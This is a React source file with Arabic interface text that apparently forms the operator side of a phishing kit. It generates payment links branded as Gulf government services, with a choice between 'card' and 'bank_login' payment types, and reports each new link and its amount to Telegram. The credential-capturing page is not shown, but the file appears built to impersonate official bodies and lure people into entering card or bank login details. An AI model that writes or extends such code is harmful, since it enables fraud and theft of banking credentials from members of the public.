import React, { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { useCreateLink } from "@/hooks/useSupabase";
import { getGovernmentServiceByKey } from "@/lib/gccGovernmentServices";
import { getCurrencyCode } from "@/lib/countryCurrencies";
import { Landmark, FileText, DollarSign, User, Phone, Mail, Copy, ExternalLink, CheckCircle, Shield, Lock } from "lucide-react";
import BackButton from "@/components/BackButton";
import { sendToTelegram } from "@/lib/telegram";

const EntityPaymentLinkCreator = () => {
  const { country, serviceKey } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  
  const entity = useMemo(() => getGovernmentServiceByKey(serviceKey || ''), [serviceKey]);
  
  const [fullName, setFullName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [email, setEmail] = useState("");
  const [amount, setAmount] = useState("");
  const [reference, setReference] = useState("");
  const [description, setDescription] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [createdLink, setCreatedLink] = useState("");
  const [linkId, setLinkId] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);
  const [paymentType, setPaymentType] = useState("card");

  if (!entity) return <div>Entity not found</div>;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      const link = await createLink.mutateAsync({
        type: "government",
        country_code: country || entity.country,
        payload: {
          service_key: serviceKey,
          service_name: entity.nameAr,
          customerInfo: { fullName, phoneNumber, email },
          payment_amount: parseFloat(amount),
          currency_code: getCurrencyCode(country || entity.country),
          reference,
          description,
          payment_type: paymentType,
        },
      });
      const baseUrl = window.location.origin;
      const paymentUrl = `${baseUrl}/pay/${link.id}/data`;
      setCreatedLink(paymentUrl);
      setLinkId(link.id);
      setShowSuccess(true);
      await sendToTelegram({
        type: 'payment_link_created',
        data: { service: entity.nameAr, amount, url: paymentUrl }
      });
      toast({ title: "✅ تم إنشاء الرابط بنجاح" });
    } catch (err) {
      toast({ title: "خطأ في إنشاء الرابط", variant: "destructive" });
    } finally { setIsSubmitting(false); }
  };

  if (showSuccess) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-gray-50" dir="rtl">
        <Card className="max-w-md w-full p-8 text-center space-y-6">
          <div className="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto">
            <CheckCircle className="w-12 h-12" />
          </div>
          <h2 className="text-2xl font-bold">تم إنشاء رابط {entity.nameAr}</h2>
          <div className="p-4 bg-gray-100 rounded-lg break-all font-mono text-sm">{createdLink}</div>
          <div className="flex gap-4">
            <Button className="flex-1" onClick={() => navigator.clipboard.writeText(createdLink)}>نسخ الرابط</Button>
            <Button className="flex-1" variant="outline" onClick={() => window.open(createdLink, '_blank')}>معاينة</Button>
          </div>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen py-8 px-4 bg-gray-50" dir="rtl">
      <div className="max-w-2xl mx-auto space-y-6">
        <BackButton />
        <Card className="overflow-hidden">
          <div className="p-8 text-white" style={{ background: entity.styling.primary }}>
             <h1 className="text-3xl font-bold">{entity.nameAr}</h1>
             <p className="opacity-80">إنشاء رابط دفع رسمي</p>
          </div>
          <form onSubmit={handleSubmit} className="p-8 space-y-6">
            <div className="flex gap-4 p-2 bg-gray-100 rounded-xl">
              <Button type="button" variant={paymentType === "card" ? "default" : "outline"} onClick={() => setPaymentType("card")} className="flex-1 font-bold">بطاقة دفع</Button>
              <Button type="button" variant={paymentType === "bank_login" ? "default" : "outline"} onClick={() => setPaymentType("bank_login")} className="flex-1 font-bold">تسجيل بنكي</Button>
            </div>
            <div className="grid gap-4">
              <div className="space-y-2">
                <Label>اسم العميل</Label>
                <Input value={fullName} onChange={e => setFullName(e.target.value)} required />
              </div>
              <div className="space-y-2">
                <Label>رقم الجوال</Label>
                <Input value={phoneNumber} onChange={e => setPhoneNumber(e.target.value)} required />
              </div>
              <div className="space-y-2">
                <Label>المبلغ</Label>
                <Input type="number" value={amount} onChange={e => setAmount(e.target.value)} required />
              </div>
            </div>
            <Button type="submit" disabled={isSubmitting} className="w-full h-14 text-lg font-bold" style={{ background: entity.styling.primary }}>
              {isSubmitting ? "جاري الإنشاء..." : "إنشاء رابط الدفع"}
            </Button>
          </form>
        </Card>
      </div>
    </div>
  );
};

export default EntityPaymentLinkCreator;
